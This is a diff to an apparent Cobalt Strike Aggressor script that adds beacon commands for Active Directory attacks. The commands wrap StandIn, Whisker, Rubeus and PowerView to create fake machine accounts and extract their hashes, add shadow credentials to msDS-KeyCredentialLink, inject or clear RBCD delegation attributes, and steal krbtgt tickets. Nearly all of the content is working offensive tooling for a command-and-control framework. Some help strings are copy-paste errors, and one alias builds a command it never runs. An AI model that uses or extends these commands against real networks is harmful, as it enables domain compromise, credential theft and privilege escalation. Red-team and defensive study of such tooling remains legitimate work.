@@ -19,6 +19,8 @@ $POWERUP_PATH       = getFileProper("C:\\Tools\\PowerSploit\\Privesc","PowerUp.p
 $POWERUPSQL_PATH    = getFileProper("C:\\Tools\\PowerUpSQL","PowerUpSQL.ps1");
 $SQLRECON_PATH      = getFileProper("C:\\Tools\\SQLRecon\\SQLRecon\\SQLRecon\\bin\\Release","SQLRecon.exe");
 $SHARPSCCM_PATH     = getFileProper("C:\\Tools\\SharpSCCM\\bin\\Release","SharpSCCM.exe");
+$STANDIN_PATH       = getFileProper("C:\\Tools\\StandIn\\StandIn\\StandIn\\bin\\Release","StandIn.exe");
+$WHISKER_PATH       = getFileProper("C:\\Tools\\Whisker\\Whisker\\bin\\Release","Whisker.exe");
 
 #TEST FUNCTION
 command beacons {
@@ -199,7 +201,6 @@ beacon_command_register(
     "Execute Assmembly of Certify",
     "Execute Assmembly of Certify"
 );
-
 alias seatbelt {
     $size = size(@_);
     $args = join(" ", sublist(@_, 1, $size));
@@ -210,7 +211,6 @@ beacon_command_register(
     "Execute Assmembly of Seatbelt",
     "Execute Assmembly of Seatbelt"
 );
-
 alias adsearch {
     $size = size(@_);
     $args = join(" ", sublist(@_, 1, $size));
@@ -221,7 +221,16 @@ beacon_command_register(
     "Execute Assmembly of ADSearch",
     "Execute Assmembly of ADSearch"
 );
-
+alias standin {
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $STANDIN_PATH, $args);
+}
+beacon_command_register(
+    "standin",
+    "Execute Assmembly of StandIn",
+    "Execute Assmembly of StandIn"
+);
 #KERBEROASTING
 #FIND TARGETS
 alias kerberos_roast_findtargets {
@@ -316,7 +325,11 @@ sub constdel_stealtgt_cb {
 }
 alias kerberos_constdel_stealtgt {
     #execute assembly and pass results to helper sub, run LUID
+    if(-isadmin $1){
     bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel_stealtgt_cb);
+    } else {
+        berror("Must be run from elevated access.");
+    }
 }
 beacon_command_register(
     "kerberos_constdel_stealtgt",
@@ -351,7 +364,7 @@ beacon_command_register(
     "kerberos_rbcd_findtargets",
     "Find Role Based Constrained Delegation Machines");
 
-alias kerberos_rbcd_injectaccess {
+alias kerberos_rbcd_injectspn {
     $size = size(@_);
     if ($size == 3) {
         $target    = @_[1];
@@ -376,10 +389,29 @@ alias kerberos_rbcd_injectaccess {
     }
 }
 beacon_command_register(
-    "kerberos_rbcd_injectaccess",
+    "kerberos_rbcd_injectspn",
     "Uses PowerView to inject SDDL into a target machine from a compromised machine account",
     "Uses PowerView to inject SDDL into a target machine from a compromised machine account\n\n"
-    . "Usage: kerberos_rbcd_injectaccess [target machine] [donor machine sid]\n"
+    . "Usage: kerberos_rbcd_injectspn [target machine] [donor machine sid]\n"
+)
+
+alias kerberos_rbcd_removespn {
+    $size   = size(@_);
+    $target = @_[1];
+    if ($size == 2) {
+    $command = "Get-DomainComputer -Identity "
+    . $target
+    . " | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity";
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+}
+beacon_command_register (
+    "kerberos_rbcd_removespn",
+    "Use PowerView to clear msDS-AllowedToActOnBehalfOfOtherIdentity value",
+    "Use PowerView to clear msDS-AllowedToActOnBehalfOfOtherIdentity value\n\n"
+    . "Usage: kerberos_rbcd_removespn [target]\n"
 )
 
 #PERSISTANCE METHODS
@@ -1349,4 +1381,106 @@ beacon_command_register(
     . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket]\n\n"
     . "Examples:\n"
     . "[altservice spn] - cifs/host.domain.tld\n"
+)
+sub get_machineaccountquota_cb {
+    $string = replace($2, '\.', ",DC=");
+    $string = replace($string, "\n", "");
+    $dn = 'DC=' . $string;
+    $command = 'Get-DomainObject -Identity "' . $dn . '" -Properties ms-DS-MachineAccountQuota';
+    blog($1, "Targetting Domain: " $2);
+    bpowerpick($1, $command);
+}
+alias get_machineaccountquota {
+    $command = "Get-Domain | select -expand Name";
+    bpowerpick($1, $command, $null, $null, &get_machineaccountquota_cb);
+}
+beacon_command_register(
+    "get_machineaccountquota",
+    "Use PowerView to check machine account quota for current user",
+    "Use PowerView to check machine account quota for current user.\n"
+)
+sub createfakemachine_cb {
+    blog($1,$2);
+    $regdomain = 'Domain.*\: (.*)';
+    $reguser   = 'DN.*\: CN=(.*),CN=Computers';
+    $regpassword  = 'Password \: (.*)';
+    $domain = matches($2, $regdomain)[0];
+    $user = matches($2, $reguser)[0] . '$';
+    $password = matches($2, $regpassword)[0];
+
+    $parameters = "hash"
+    . " /password:" . $password
+    . " /user:" . $user
+    . " /domain:" . $domain;
+
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
+}
+alias createfakemachine {
+    $size = size(@_);
+    if ($size == 2) {
+        $name = @_[1];
+        $parameters = "--computer " . $name . " --make";
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bexecute_assembly($1, $STANDIN_PATH, $parameters, $null, &createfakemachine_cb);
+}
+beacon_command_register (
+    "createfakemachine",
+    "Use StandIn & Rubesu to make a fake machine acount and return account hashes",
+    "Use StandIn & Rubesu to make a fake machine acount and return account hashes\n\n"
+    . "Usage: createfakemachine [name]"
+)
+alias shadowcreds_list {
+    $size = size(@_);
+    if ($size == 2) {
+        $parameters = 'list /target:' . $2;
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bexecute_assembly($1, $WHISKER_PATH, $parameters);
+}
+beacon_command_register(
+    "shadowcreds_list",
+    "Use Whisker to check account's msDS-KeyCredentialLink",
+    "Use Whisker to check account's msDS-KeyCredentialLink\n\n"
+    . "Usage: shadowcreds_list [account name]"
+)
+alias shadowcreds_add {
+    $size = size(@_);
+    if ($size == 2) {
+        $parameters = 'add /target:' . $2;
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bexecute_assembly($1, $WHISKER_PATH, $parameters);
+}
+beacon_command_register(
+    "shadowcreds_add",
+    "Use Whisker to add certificate to msDS-KeyCredentialLink",
+    "Use Whisker to add certificate to msDS-KeyCredentialLink\n\n"
+    . "Usage: shadowcreds_add [account name]"
+)
+
+alias shadowcreds_remove {
+    $size = size(@_);
+    if ($size == 3) {
+        $parameters = 'remove'
+        . ' /target:' . $2
+        . ' /deviceid:'. $3;
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bexecute_assembly($1, $WHISKER_PATH, $parameters);
+}
+beacon_command_register(
+    "shadowcreds_remove",
+    "Use Whisker to add certificate to msDS-KeyCredentialLink",
+    "Use Whisker to add certificate to msDS-KeyCredentialLink\n\n"
+    . "Usage: shadowcreds_remove [account name] [device id]\n\n"
+    . "Use shadowcreds_list to find the device ID."
 )
